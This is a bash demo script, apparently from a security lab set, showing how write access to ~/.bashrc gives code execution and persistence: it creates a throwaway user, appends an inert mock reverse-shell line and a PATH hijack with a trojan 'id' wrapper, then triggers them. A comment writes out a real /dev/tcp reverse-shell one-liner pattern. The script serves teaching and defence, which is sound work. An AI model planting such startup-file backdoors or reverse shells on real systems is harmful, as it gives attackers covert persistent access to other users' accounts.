#!/usr/bin/env bash
set -Eeuo pipefail
DEMO_DESCRIPTION='Abuse of ~/.bashrc: code runs as the owner on login (persistence + PATH hijack). Payloads are inert.'
source "$(dirname "${BASH_SOURCE[0]}")/lib/common.sh"
demo_init "$@"
need useradd userdel groupdel getent runuser install tail

U=ossec-demo1
! getent passwd "$U" >/dev/null || die "$U already exists"
cleanup() {
  local rc=0
  if getent passwd "$U" >/dev/null; then
    userdel -r "$U" 2>/dev/null || userdel "$U" || { printf 'Remove %s manually\n' "$U" >&2; rc=1; }
  fi
  getent group "$U" >/dev/null && { groupdel "$U" 2>/dev/null || true; }
  return "$rc"
}
run useradd -m -s /bin/bash "$U"
H=/home/"$U"
# marker so the capture shows that ~/.bashrc actually ran
printf 'echo "[.bashrc] выполнен"\n' >>"$H/.bashrc"

printf '\n### Attacker: write access to a start-up file = code execution as its owner\n'
# A *mock* reverse shell. The appended line is a plain echo: nothing connects anywhere.
# It stands in for a real `bash -i >& /dev/tcp/<ip>/<port> 0>&1` one-liner without doing it.
PAYLOAD='echo "[backdoor] reverse shell -> 203.0.113.66:4444 (демо-заглушка, без сети)"'
printf '%s\n' "$PAYLOAD" >>"$H/.bashrc"
# PATH hijack: a trojan `id` earlier on PATH shadows the real one
install -d -m 0755 "$H/.local/bin"
cat >"$H/.local/bin/id" <<'EOF'
#!/bin/sh
echo "[trojan id] вызов перехвачен; вывод можно подделать"
exec /usr/bin/id "$@"
EOF
chmod 0755 "$H/.local/bin/id"
chown -R "$U:$U" "$H/.local"
printf 'export PATH="$HOME/.local/bin:$PATH"\n' >>"$H/.bashrc"
run tail -n 3 "$H/.bashrc"

printf '\n### Victim: a plain interactive session fires the payloads as the victim\n'
printf '$ bash -i -c %q   # обычный сеанс жертвы\n' 'command -v id; id -un'
runuser -u "$U" -- bash -i -c 'command -v id; id -un' 2>/dev/null || true
